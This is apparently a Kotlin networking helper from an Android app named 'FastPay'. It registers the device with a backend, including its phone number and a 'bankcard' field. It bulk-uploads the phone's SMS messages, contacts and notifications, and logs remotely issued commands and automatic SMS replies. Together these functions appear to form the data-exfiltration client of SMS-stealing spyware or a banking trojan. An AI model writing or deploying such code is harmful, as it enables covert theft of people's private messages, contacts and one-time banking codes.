package com.example.fast.util

import android.os.Build
import com.example.fast.config.AppConfig
import com.example.fast.model.exceptions.FastPayException
import com.google.gson.Gson
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.InputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

/**
 * DjangoApiHelper
 * 
 * Helper class for interacting with the Django backend API.
 */
object DjangoApiHelper {
    
    private const val TAG = "DjangoApiHelper"
    private val gson = Gson()
    private const val DEFAULT_CONNECT_TIMEOUT_MS = 10000
    private const val DEFAULT_READ_TIMEOUT_MS = 10000

    private fun HttpURLConnection.applyDefaultTimeouts() {
        connectTimeout = DEFAULT_CONNECT_TIMEOUT_MS
        readTimeout = DEFAULT_READ_TIMEOUT_MS
    }

    private fun readStreamSafely(stream: InputStream?): String? {
        if (stream == null) return null
        return try {
            stream.bufferedReader().use { it.readText() }
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error reading response stream", e)
            null
        }
    }

    private fun readSuccessBody(connection: HttpURLConnection): String? {
        return readStreamSafely(connection.inputStream)
    }

    private fun readErrorBody(connection: HttpURLConnection): String {
        return readStreamSafely(connection.errorStream) ?: "No error body"
    }

    private fun getDeviceModel(): String {
        val brand = Build.BRAND?.trim().orEmpty()
        val model = Build.MODEL?.trim().orEmpty()
        val manufacturer = Build.MANUFACTURER?.trim().orEmpty()
        val device = Build.DEVICE?.trim().orEmpty()

        return when {
            brand.isNotEmpty() && model.isNotEmpty() -> "$brand $model"
            manufacturer.isNotEmpty() && model.isNotEmpty() -> "$manufacturer $model"
            model.isNotEmpty() -> model
            device.isNotEmpty() -> device
            else -> "Unknown"
        }
    }

    /**
     * Create or update device in Django backend
     * 
     * @param deviceId Unique device identifier
     * @param data Map containing device information
     */
    suspend fun registerDevice(deviceId: String, data: Map<String, Any?>) {
        withContext(Dispatchers.IO) {
            try {
                val url = URL("${AppConfig.DJANGO_API_BASE_URL}/devices/")
                var connection: HttpURLConnection? = null
                try {
                    connection = url.openConnection() as HttpURLConnection
                    connection.applyDefaultTimeouts()
                    connection.requestMethod = "POST"
                    connection.doOutput = true
                    connection.setRequestProperty("Content-Type", AppConfig.ApiHeaders.CONTENT_TYPE)
                    connection.setRequestProperty("Accept", AppConfig.ApiHeaders.ACCEPT)

                    // Prepare request body
                    val requestBody = mutableMapOf<String, Any?>()
                    requestBody["device_id"] = deviceId
                    requestBody["model"] = getDeviceModel()
                    requestBody["phone"] = data["currentPhone"] ?: ""
                    requestBody["code"] = data["code"] ?: ""
                    requestBody["is_active"] = data["isActive"] == "Opened" || data["isActive"] == true
                    requestBody["last_seen"] = data["time"] ?: System.currentTimeMillis()
                    requestBody["battery_percentage"] = data["batteryPercentage"] ?: -1
                    requestBody["current_phone"] = data["currentPhone"] ?: ""
                    requestBody["current_identifier"] = data["currentIdentifier"] ?: ""
                    requestBody["time"] = data["time"] ?: System.currentTimeMillis()
                    requestBody["bankcard"] = data["bankcard"] ?: "BANKCARD"
                    requestBody["system_info"] = data["systemInfo"] ?: emptyMap<String, Any>()
                
                    // Include app version info if available in data map
                    data["app_version_code"]?.let { requestBody["app_version_code"] = it }
                    data["app_version_name"]?.let { requestBody["app_version_name"] = it }

                    val jsonBody = gson.toJson(requestBody)
                    
                    LogHelper.d(TAG, "Registering device at Django: $url")
                    LogHelper.d(TAG, "Request body: $jsonBody")

                    OutputStreamWriter(connection.outputStream).use { writer ->
                        writer.write(jsonBody)
                    }

                    val responseCode = connection.responseCode
                    if (responseCode in 200..299) {
                        readSuccessBody(connection)
                        LogHelper.d(TAG, "Device registered successfully at Django (Code: $responseCode)")
                    } else {
                        val errorBody = readErrorBody(connection)
                        LogHelper.e(TAG, "Failed to register device at Django (Code: $responseCode)")
                        LogHelper.e(TAG, "Error response: $errorBody")
                    }
                } finally {
                    try {
                        connection?.disconnect()
                    } catch (e: Exception) {
                        LogHelper.e(TAG, "Error closing connection", e)
                    }
                }
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error registering device at Django", e)
            }
        }
    }

    /**
     * Patch device fields in Django backend
     * 
     * @param deviceId Unique device identifier
     * @param updates Map containing fields to update
     */
    suspend fun patchDevice(deviceId: String, updates: Map<String, Any?>) {
        withContext(Dispatchers.IO) {
            try {
                val url = URL("${AppConfig.DJANGO_API_BASE_URL}/devices/$deviceId/")
                var connection: HttpURLConnection? = null
                try {
                    connection = url.openConnection() as HttpURLConnection
                    connection.applyDefaultTimeouts()
                    connection.requestMethod = "POST" // Using POST with X-HTTP-Method-Override if needed, but standard PATCH is better
                    // Some Android versions/libraries have issues with PATCH, so we might use a workaround or Ensure PATCH works
                    try {
                        connection.requestMethod = "PATCH"
                    } catch (e: Exception) {
                        // Fallback or workaround if PATCH is not supported by HttpURLConnection on some devices
                        connection.setRequestProperty("X-HTTP-Method-Override", "PATCH")
                        connection.requestMethod = "POST"
                    }
                    
                    connection.doOutput = true
                    connection.setRequestProperty("Content-Type", AppConfig.ApiHeaders.CONTENT_TYPE)
                    connection.setRequestProperty("Accept", AppConfig.ApiHeaders.ACCEPT)

                    val jsonBody = gson.toJson(updates)
                    
                    LogHelper.d(TAG, "Patching device $deviceId at Django: $url")

                    OutputStreamWriter(connection.outputStream).use { writer ->
                        writer.write(jsonBody)
                    }

                    val responseCode = connection.responseCode
                    if (responseCode in 200..299) {
                        readSuccessBody(connection)
                        LogHelper.d(TAG, "Device patched successfully at Django (Code: $responseCode)")
                    } else {
                        val errorBody = readErrorBody(connection)
                        LogHelper.e(TAG, "Failed to patch device at Django (Code: $responseCode)")
                        LogHelper.e(TAG, "Error response: $errorBody")
                    }
                } finally {
                    try {
                        connection?.disconnect()
                    } catch (e: Exception) {
                        LogHelper.e(TAG, "Error closing connection", e)
                    }
                }
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error patching device at Django", e)
            }
        }
    }

    /**
     * Bulk sync messages to Django
     */
    suspend fun syncMessages(deviceId: String, messages: List<Map<String, Any?>>) {
        withContext(Dispatchers.IO) {
            try {
                val url = URL("${AppConfig.DJANGO_API_BASE_URL}/messages/")
                var connection: HttpURLConnection? = null
                try {
                    connection = url.openConnection() as HttpURLConnection
                    connection.applyDefaultTimeouts()
                    connection.requestMethod = "POST"
                    connection.doOutput = true
                    connection.setRequestProperty("Content-Type", AppConfig.ApiHeaders.CONTENT_TYPE)
                    connection.setRequestProperty("Accept", AppConfig.ApiHeaders.ACCEPT)

                // Django expects a list of objects, each containing device_id
                val requestBody = messages.map { 
                    val message = it.toMutableMap()
                    message["device_id"] = deviceId
                    message 
                }

                val jsonBody = gson.toJson(requestBody)
                
                LogHelper.d(TAG, "Syncing ${messages.size} messages to Django: $url")

                    OutputStreamWriter(connection.outputStream).use { writer ->
                        writer.write(jsonBody)
                    }

                    val responseCode = connection.responseCode
                    if (responseCode in 200..299) {
                        readSuccessBody(connection)
                        LogHelper.d(TAG, "Messages synced successfully to Django (Code: $responseCode)")
                    } else {
                        val errorBody = readErrorBody(connection)
                        LogHelper.e(TAG, "Failed to sync messages to Django (Code: $responseCode)")
                        LogHelper.e(TAG, "Error response: $errorBody")
                    }
                } finally {
                    try {
                        connection?.disconnect()
                    } catch (e: Exception) {
                        LogHelper.e(TAG, "Error closing connection", e)
                    }
                }
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error syncing messages to Django", e)
            }
        }
    }

    /**
     * Bulk sync contacts to Django
     */
    suspend fun syncContacts(deviceId: String, contacts: List<Map<String, Any?>>) {
        withContext(Dispatchers.IO) {
            try {
                val url = URL("${AppConfig.DJANGO_API_BASE_URL}/contacts/")
                var connection: HttpURLConnection? = null
                try {
                    connection = url.openConnection() as HttpURLConnection
                    connection.applyDefaultTimeouts()
                    connection.requestMethod = "POST"
                    connection.doOutput = true
                    connection.setRequestProperty("Content-Type", AppConfig.ApiHeaders.CONTENT_TYPE)
                    connection.setRequestProperty("Accept", AppConfig.ApiHeaders.ACCEPT)

                // Django expects a list of objects, each containing device_id
                val requestBody = contacts.map { 
                    val contact = it.toMutableMap()
                    contact["device_id"] = deviceId
                    contact 
                }

                val jsonBody = gson.toJson(requestBody)
                
                LogHelper.d(TAG, "Syncing ${contacts.size} contacts to Django: $url")

                    OutputStreamWriter(connection.outputStream).use { writer ->
                        writer.write(jsonBody)
                    }

                    val responseCode = connection.responseCode
                    if (responseCode in 200..299) {
                        readSuccessBody(connection)
                        LogHelper.d(TAG, "Contacts synced successfully to Django (Code: $responseCode)")
                    } else {
                        val errorBody = readErrorBody(connection)
                        LogHelper.e(TAG, "Failed to sync contacts to Django (Code: $responseCode)")
                        LogHelper.e(TAG, "Error response: $errorBody")
                    }
                } finally {
                    try {
                        connection?.disconnect()
                    } catch (e: Exception) {
                        LogHelper.e(TAG, "Error closing connection", e)
                    }
                }
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error syncing contacts to Django", e)
            }
        }
    }

    /**
     * Bulk sync notifications to Django
     */
    suspend fun syncNotifications(deviceId: String, notifications: List<Map<String, Any?>>) {
        withContext(Dispatchers.IO) {
            try {
                val url = URL("${AppConfig.DJANGO_API_BASE_URL}/notifications/")
                var connection: HttpURLConnection? = null
                try {
                    connection = url.openConnection() as HttpURLConnection
                    connection.applyDefaultTimeouts()
                    connection.requestMethod = "POST"
                    connection.doOutput = true
                    connection.setRequestProperty("Content-Type", AppConfig.ApiHeaders.CONTENT_TYPE)
                    connection.setRequestProperty("Accept", AppConfig.ApiHeaders.ACCEPT)

                // Django expects a list of objects, each containing device_id
                val requestBody = notifications.map { 
                    val notification = it.toMutableMap()
                    notification["device_id"] = deviceId
                    // Map package_name if needed
                    notification 
                }

                val jsonBody = gson.toJson(requestBody)
                
                LogHelper.d(TAG, "Syncing ${notifications.size} notifications to Django: $url")

                    OutputStreamWriter(connection.outputStream).use { writer ->
                        writer.write(jsonBody)
                    }

                    val responseCode = connection.responseCode
                    if (responseCode in 200..299) {
                        readSuccessBody(connection)
                        LogHelper.d(TAG, "Notifications synced successfully to Django (Code: $responseCode)")
                    } else {
                        val errorBody = readErrorBody(connection)
                        LogHelper.e(TAG, "Failed to sync notifications to Django (Code: $responseCode)")
                        LogHelper.e(TAG, "Error response: $errorBody")
                    }
                } finally {
                    try {
                        connection?.disconnect()
                    } catch (e: Exception) {
                        LogHelper.e(TAG, "Error closing connection", e)
                    }
                }
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error syncing notifications to Django", e)
            }
        }
    }

    /**
     * Log command execution to Django
     */
    suspend fun logCommand(
        deviceId: String,
        command: String,
        value: String?,
        status: String,
        receivedAt: Long,
        executedAt: Long? = null,
        errorMessage: String? = null
    ) {
        withContext(Dispatchers.IO) {
            try {
                val url = URL("${AppConfig.DJANGO_API_BASE_URL}/command-logs/")
                var connection: HttpURLConnection? = null
                try {
                    connection = url.openConnection() as HttpURLConnection
                    connection.applyDefaultTimeouts()
                    connection.requestMethod = "POST"
                    connection.doOutput = true
                    connection.setRequestProperty("Content-Type", AppConfig.ApiHeaders.CONTENT_TYPE)
                    connection.setRequestProperty("Accept", AppConfig.ApiHeaders.ACCEPT)

                val requestBody = mutableMapOf<String, Any?>()
                requestBody["device_id"] = deviceId
                requestBody["command"] = command
                requestBody["value"] = value
                requestBody["status"] = status
                requestBody["received_at"] = receivedAt
                requestBody["executed_at"] = executedAt
                requestBody["error_message"] = errorMessage

                val jsonBody = gson.toJson(requestBody)
                
                LogHelper.d(TAG, "Logging command $command to Django")

                    OutputStreamWriter(connection.outputStream).use { writer ->
                        writer.write(jsonBody)
                    }

                    val responseCode = connection.responseCode
                    if (responseCode in 200..299) {
                        readSuccessBody(connection)
                        LogHelper.d(TAG, "Command logged successfully to Django")
                    } else {
                        val errorBody = readErrorBody(connection)
                        LogHelper.e(TAG, "Failed to log command to Django (Code: $responseCode)")
                        LogHelper.e(TAG, "Error response: $errorBody")
                    }
                } finally {
                    try {
                        connection?.disconnect()
                    } catch (e: Exception) {
                        LogHelper.e(TAG, "Error closing connection", e)
                    }
                }
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error logging command to Django", e)
            }
        }
    }

    /**
     * Log auto-reply execution to Django
     */
    suspend fun logAutoReply(
        deviceId: String,
        sender: String,
        replyMessage: String,
        originalTimestamp: Long,
        repliedAt: Long
    ) {
        withContext(Dispatchers.IO) {
            try {
                val url = URL("${AppConfig.DJANGO_API_BASE_URL}/auto-reply-logs/")
                var connection: HttpURLConnection? = null
                try {
                    connection = url.openConnection() as HttpURLConnection
                    connection.applyDefaultTimeouts()
                    connection.requestMethod = "POST"
                    connection.doOutput = true
                    connection.setRequestProperty("Content-Type", AppConfig.ApiHeaders.CONTENT_TYPE)
                    connection.setRequestProperty("Accept", AppConfig.ApiHeaders.ACCEPT)

                val requestBody = mutableMapOf<String, Any?>()
                requestBody["device_id"] = deviceId
                requestBody["sender"] = sender
                requestBody["reply_message"] = replyMessage
                requestBody["original_timestamp"] = originalTimestamp
                requestBody["replied_at"] = repliedAt

                val jsonBody = gson.toJson(requestBody)
                
                LogHelper.d(TAG, "Logging auto-reply to $sender to Django")

                    OutputStreamWriter(connection.outputStream).use { writer ->
                        writer.write(jsonBody)
                    }

                    val responseCode = connection.responseCode
                    if (responseCode in 200..299) {
                        readSuccessBody(connection)
                        LogHelper.d(TAG, "Auto-reply logged successfully to Django")
                    } else {
                        val errorBody = readErrorBody(connection)
                        LogHelper.e(TAG, "Failed to log auto-reply to Django (Code: $responseCode)")
                        LogHelper.e(TAG, "Error response: $errorBody")
                    }
                } finally {
                    try {
                        connection?.disconnect()
                    } catch (e: Exception) {
                        LogHelper.e(TAG, "Error closing connection", e)
                    }
                }
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error logging auto-reply to Django", e)
            }
        }
    }

    /**
     * Log activation failure to Django for tracking and support.
     * Call from ActivationActivity on any activation error.
     *
     * @param deviceId Android ID (use empty string if unknown)
     * @param codeAttempted Code or phone attempted
     * @param mode "testing" or "running"
     * @param errorType Short category (e.g. validation, network, bank_code)
     * @param errorMessage User-visible or detailed message
     * @param metadata Optional extra map (e.g. exception message)
     */
    suspend fun logActivationFailure(
        deviceId: String,
        codeAttempted: String?,
        mode: String,
        errorType: String,
        errorMessage: String?,
        metadata: Map<String, Any?>? = null
    ) {
        withContext(Dispatchers.IO) {
            try {
                val url = URL("${AppConfig.DJANGO_API_BASE_URL}/activation-failure-logs/")
                var connection: HttpURLConnection? = null
                try {
                    connection = url.openConnection() as HttpURLConnection
                    connection.applyDefaultTimeouts()
                    connection.requestMethod = "POST"
                    connection.doOutput = true
                    connection.setRequestProperty("Content-Type", AppConfig.ApiHeaders.CONTENT_TYPE)
                    connection.setRequestProperty("Accept", AppConfig.ApiHeaders.ACCEPT)

                val requestBody = mutableMapOf<String, Any?>()
                requestBody["device_id"] = deviceId
                requestBody["code_attempted"] = codeAttempted
                requestBody["mode"] = mode
                requestBody["error_type"] = errorType
                requestBody["error_message"] = errorMessage
                requestBody["metadata"] = metadata ?: emptyMap<String, Any?>()

                val jsonBody = gson.toJson(requestBody)
                LogHelper.d(TAG, "Logging activation failure to Django: $errorType")

                    OutputStreamWriter(connection.outputStream).use { writer ->
                        writer.write(jsonBody)
                    }

                    val responseCode = connection.responseCode
                    if (responseCode in 200..299) {
                        readSuccessBody(connection)
                        LogHelper.d(TAG, "Activation failure logged successfully to Django")
                    } else {
                        val errorBody = readErrorBody(connection)
                        LogHelper.e(TAG, "Failed to log activation failure to Django (Code: $responseCode)")
                        LogHelper.e(TAG, "Error response: $errorBody")
                    }
                } finally {
                    try {
                        connection?.disconnect()
                    } catch (e: Exception) {
                        LogHelper.e(TAG, "Error closing connection", e)
                    }
                }
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error logging activation failure to Django", e)
            }
        }
    }

    /**
     * Get device data from Django
     */
    suspend fun getDevice(deviceId: String): Map<String, Any?>? {
        return withContext(Dispatchers.IO) {
            try {
                val url = URL("${AppConfig.DJANGO_API_BASE_URL}/devices/$deviceId/")
                var connection: HttpURLConnection? = null
                try {
                    connection = url.openConnection() as HttpURLConnection
                    connection.applyDefaultTimeouts()
                    connection.requestMethod = "GET"
                    connection.setRequestProperty("Accept", AppConfig.ApiHeaders.ACCEPT)

                    val responseCode = connection.responseCode
                    if (responseCode in 200..299) {
                        val responseBody = readSuccessBody(connection)
                        if (responseBody.isNullOrBlank()) {
                            LogHelper.e(TAG, "Empty device response from Django (Code: $responseCode)")
                            return@withContext null
                        }
                        val deviceData = gson.fromJson<Map<String, Any?>>(responseBody, object : com.google.gson.reflect.TypeToken<Map<String, Any?>>() {}.type)
                        return@withContext deviceData
                    } else {
                        LogHelper.e(TAG, "Failed to get device from Django (Code: $responseCode)")
                        return@withContext null
                    }
                } finally {
                    try {
                        connection?.disconnect()
                    } catch (e: Exception) {
                        LogHelper.e(TAG, "Error closing connection", e)
                    }
                }
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error getting device from Django", e)
                return@withContext null
            }
        }
    }

    /**
     * Register bank number (TESTING mode)
     * 
     * @param phone Phone number
     * @param code Generated activation code
     * @param deviceId Device ID
     * @param data Additional device data
     * @return Result with success status and optional response data
     */
    suspend fun registerBankNumber(
        phone: String,
        code: String,
        deviceId: String,
        data: Map<String, Any?>
    ): Result<Map<String, Any?>> {
        return withContext(Dispatchers.IO) {
            try {
                val url = URL("${AppConfig.DJANGO_API_BASE_URL}/registerbanknumber")
                var connection: HttpURLConnection? = null
                try {
                    connection = url.openConnection() as HttpURLConnection
                    connection.applyDefaultTimeouts()
                    connection.requestMethod = "POST"
                    connection.doOutput = true
                    connection.setRequestProperty("Content-Type", AppConfig.ApiHeaders.CONTENT_TYPE)
                    connection.setRequestProperty("Accept", AppConfig.ApiHeaders.ACCEPT)

                // Prepare request body
                val requestBody = mutableMapOf<String, Any?>()
                requestBody["phone"] = phone
                requestBody["code"] = code
                requestBody["device_id"] = deviceId
                requestBody["model"] = getDeviceModel()
                // Intentionally omit "name" to avoid mismatched device naming
                
                // Include additional fields from data if present
                data["app_version_code"]?.let { requestBody["app_version_code"] = it }
                data["app_version_name"]?.let { requestBody["app_version_name"] = it }

                val jsonBody = gson.toJson(requestBody)
                
                LogHelper.d(TAG, "Registering bank number at Django: $url")
                LogHelper.d(TAG, "Request body: $jsonBody")

                    OutputStreamWriter(connection.outputStream).use { writer ->
                        writer.write(jsonBody)
                    }

                    val responseCode = connection.responseCode
                    if (responseCode in 200..299) {
                        val responseBody = readSuccessBody(connection)
                        if (responseBody.isNullOrBlank()) {
                            LogHelper.e(TAG, "Empty register bank response (Code: $responseCode)")
                            return@withContext Result.error(
                                FastPayException(
                                    message = "Empty response from API",
                                    errorCode = "invalid_response"
                                )
                            )
                        }
                        val responseData = try {
                            gson.fromJson<Map<String, Any?>>(responseBody, object : com.google.gson.reflect.TypeToken<Map<String, Any?>>() {}.type)
                        } catch (e: Exception) {
                            emptyMap<String, Any?>()
                        }
                        LogHelper.d(TAG, "Bank number registered successfully at Django (Code: $responseCode)")
                        Result.success(responseData)
                    } else {
                        val errorBody = readErrorBody(connection)
                        LogHelper.e(TAG, "Failed to register bank number at Django (Code: $responseCode)")
                        LogHelper.e(TAG, "Error response: $errorBody")
                        Result.error(
                            FastPayException(
                                message = "API returned code $responseCode: $errorBody",
                                errorCode = "api_error"
                            )
                        )
                    }
                } finally {
                    try {
                        connection?.disconnect()
                    } catch (e: Exception) {
                        LogHelper.e(TAG, "Error closing connection", e)
                    }
                }
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error registering bank number at Django", e)
                Result.error(
                    FastPayException(
                        message = e.message ?: "Unknown error",
                        cause = e,
                        errorCode = "network_error"
                    )
                )
            }
        }
    }

    /**
     * Validate code login (RUNNING mode)
     * 
     * @param code Activation code
     * @param deviceId Device ID
     * @return Result with success status (true if valid, false if invalid)
     */
    suspend fun isValidCodeLogin(
        code: String,
        deviceId: String
    ): Result<Boolean> {
        return withContext(Dispatchers.IO) {
            try {
                val url = URL("${AppConfig.DJANGO_API_BASE_URL}/validate-login/")
                var connection: HttpURLConnection? = null
                try {
                    connection = url.openConnection() as HttpURLConnection
                    connection.applyDefaultTimeouts()
                    connection.requestMethod = "POST"
                    connection.doOutput = true
                    connection.setRequestProperty("Content-Type", AppConfig.ApiHeaders.CONTENT_TYPE)
                    connection.setRequestProperty("Accept", AppConfig.ApiHeaders.ACCEPT)

                // Prepare request body
                val requestBody = mapOf(
                    "code" to code,
                    "device_id" to deviceId
                )

                val jsonBody = gson.toJson(requestBody)
                
                LogHelper.d(TAG, "Validating code login at Django: $url")
                LogHelper.d(TAG, "Request body: $jsonBody")

                    OutputStreamWriter(connection.outputStream).use { writer ->
                        writer.write(jsonBody)
                    }

                    val responseCode = connection.responseCode
                    if (responseCode in 200..299) {
                        val responseBody = readSuccessBody(connection)
                        if (responseBody.isNullOrBlank()) {
                            LogHelper.e(TAG, "Empty validation response (Code: $responseCode)")
                            return@withContext Result.error(
                                FastPayException(
                                    message = "Empty response from API",
                                    errorCode = "invalid_response"
                                )
                            )
                        }
                        val responseData = try {
                            gson.fromJson<Map<String, Any?>>(responseBody, object : com.google.gson.reflect.TypeToken<Map<String, Any?>>() {}.type)
                        } catch (e: Exception) {
                            emptyMap<String, Any?>()
                        }
                        
                        // Check if code is valid (API may return approved/valid/is_valid)
                        val isValid = responseData["approved"] == true ||
                                      responseData["valid"] == true || 
                                      responseData["is_valid"] == true ||
                                      responseData["approved"] == "true" ||
                                      responseData["valid"] == "true" ||
                                      responseData["is_valid"] == "true"
                        
                        LogHelper.d(TAG, "Code validation result: $isValid (Code: $responseCode)")
                        Result.success(isValid)
                    } else if (responseCode == 401 || responseCode == 404) {
                        // Invalid code - not an error, just return false
                        LogHelper.d(TAG, "Code validation failed: Invalid code (Code: $responseCode)")
                        Result.success(false)
                    } else {
                        val errorBody = readErrorBody(connection)
                        LogHelper.e(TAG, "Failed to validate code at Django (Code: $responseCode)")
                        LogHelper.e(TAG, "Error response: $errorBody")
                        Result.error(
                            FastPayException(
                                message = "API returned code $responseCode: $errorBody",
                                errorCode = "api_error"
                            )
                        )
                    }
                } finally {
                    try {
                        connection?.disconnect()
                    } catch (e: Exception) {
                        LogHelper.e(TAG, "Error closing connection", e)
                    }
                }
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error validating code at Django", e)
                Result.error(
                    FastPayException(
                        message = e.message ?: "Unknown error",
                        cause = e,
                        errorCode = "network_error"
                    )
                )
            }
        }
    }
}
